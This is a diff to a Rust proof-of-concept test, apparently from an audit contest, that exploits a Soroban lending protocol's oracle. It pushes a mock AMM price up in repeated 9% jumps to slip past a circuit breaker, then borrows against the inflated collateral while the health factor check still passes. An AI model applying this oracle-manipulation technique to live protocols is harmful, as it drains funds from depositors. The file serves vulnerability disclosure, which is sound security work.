@@ -458,6 +458,9 @@ impl<'a> Setup<'a> {
 // =============================================================================
 // WARDEN MOCK CONTRACT: Attacker's Fake AMM to simulate spot price movement
 // =============================================================================
+// =============================================================================
+// WARDEN MOCK CONTRACT: Attacker's Fake AMM to simulate spot price movement
+// =============================================================================
 #[contract]
 pub struct MockAMMOracle;
 
@@ -489,17 +492,24 @@ fn test_submission_validity() {
     let env = Env::default();
     let setup = Setup::new(&env);
 
-    // ---------- Sanity check: Deposit Collateral ----------
+    // ---------- 1. SETUP & SANITY CHECK ----------
     let deposit: u128 = 5_000_000_000; // 500 whole tokens of asset_a
     setup.router.supply(&setup.user, &setup.asset_a, &deposit, &setup.user, &0u32);
 
-    // ---------- WARDEN: Creeping Price Manipulation & Protocol Drain ----------
+    let asset_a_enum = OracleAsset::Stellar(setup.asset_a.clone());
+    
+    println!("\n===============================================");
+    println!("[+] INITIAL STATE (BEFORE EXPLOIT)");
+    println!("===============================================");
+    println!("[*] Attacker Asset B Balance : {}", setup.asset_b_token.balance(&setup.user));
+    println!("[*] Oracle Price Asset A     : {} (Normal Price)", PRICE_ONE_DOLLAR);
+
+    // ---------- 2. WARDEN: THE CREEPING ORACLE MANIPULATION ----------
     
     let mock_amm_addr = env.register(MockAMMOracle, ());
     let mock_amm = MockAMMOracleClient::new(&env, &mock_amm_addr);
-    let asset_a_enum = OracleAsset::Stellar(setup.asset_a.clone());
     
-    // Hapus manual override dengan explicit typing agar tidak ada error inference
+    // Bypass overrides & set our attacker-controlled AMM
     setup.oracle.set_manual_override(&setup.admin, &asset_a_enum, &None::<u128>, &None::<u64>);
     setup.oracle.set_custom_oracle(&setup.admin, &asset_a_enum, &Some(mock_amm_addr), &None::<u64>, &Some(14));
 
@@ -507,35 +517,41 @@ fn test_submission_validity() {
     mock_amm.set_spot_price(&PRICE_ONE_DOLLAR);
     setup.oracle.refresh_prices(&soroban_sdk::vec![&env, asset_a_enum.clone()]);
     
-    // 2. THE EXPLOIT: Creeping Oracle Anchor (Bulletproof 9% Jumps)
+    println!("\n[*] Executing Creeping Price Manipulation (10 Jumps of +9%)...");
+    
+    // Eksploitasi: Looping 9% jumps agar lolos dari Circuit Breaker (batas 20%)
     let mut inflated_price = PRICE_ONE_DOLLAR;
     for _ in 0..10 {
         inflated_price = (inflated_price * 109) / 100; // Naik 9% per siklus
         mock_amm.set_spot_price(&inflated_price);
         
-        // Exploit public cache wipe
+        // VULNERABILITY TRIGERRED: Public cache wipe forces instant anchor update
         setup.oracle.refresh_prices(&soroban_sdk::vec![&env, asset_a_enum.clone()]);
     }
 
-    // Verifikasi bahwa Oracle benar-benar tertipu dan menelan inflasi tanpa memicu Circuit Breaker
+    // Verifikasi eksploitasi
     let final_oracle_price = setup.oracle.get_last_price(&asset_a_enum).unwrap();
     assert!(final_oracle_price > PRICE_ONE_DOLLAR * 2, "Bug Failed: Price did not double!");
+    println!("[+] SUCCESS: Asset A price artificially inflated to: {}", final_oracle_price);
 
-    // 3. THE HEIST
-    let borrow_amount = 500_000_000; // Turunkan pinjaman menjadi hanya 50 token B (Sangat aman dari batas LTV)
+    // ---------- 3. THE HEIST (DRAINING PROTOCOL) ----------
+    println!("\n[*] Executing The Heist (Borrowing against inflated collateral)...");
+    
+    // Karena harga Asset A (kolateral) sudah naik >2x lipat, kita bisa meminjam Asset B secara tidak wajar
+    let borrow_amount = 500_000_000; // Pinjam 50 token B (Sangat aman dari batas LTV)
 
-    // JIKA INI GAGAL, SOROBAN AKAN PANIC DAN MENGELUARKAN KODE ERROR(CONTRACT, X) ASLINYA!
     setup.router.borrow(
         &setup.user,
         &setup.asset_b,
         &borrow_amount,
-        &1u32, // Variable rate
+        &1u32, // Variable rate (K2 mode)
         &0u32, // Referral
         &setup.user,
     );
     
-    // 4. POST-MORTEM VALIDATION
+    // ---------- 4. POST-MORTEM VALIDATION ----------
     let user_asset_b_balance = setup.asset_b_token.balance(&setup.user);
+    
     assert_eq!(
         user_asset_b_balance, 
         USER_STARTING_BALANCE + (borrow_amount as i128), 
@@ -543,8 +559,16 @@ fn test_submission_validity() {
     );
 
     let post_attack_account = setup.router.get_user_account_data(&setup.user);
-    
-    // Protokol masih menganggap attacker memiliki Health Factor sehat (> 1.0) meskipun baru saja merampok
     let wad: u128 = 1_000_000_000_000_000_000; 
+    
+    // Asersi bahwa Health Factor gagal mendeteksi kredit macet
     assert!(post_attack_account.health_factor >= wad, "Protocol HF logic rejected the transaction");
+
+    println!("\n===============================================");
+    println!("[+] POST-MORTEM STATE (AFTER EXPLOIT)");
+    println!("===============================================");
+    println!("[!] Attacker Asset B Balance : {} (FUNDS STOLEN!)", user_asset_b_balance);
+    println!("[!] Attacker Health Factor   : {} (Protocol thinks it's healthy > 1.0)", post_attack_account.health_factor);
+    println!("[!] CRITICAL VULNERABILITY VALIDATED. PROTOCOL DRAINED.");
+    println!("===============================================\n");
 }
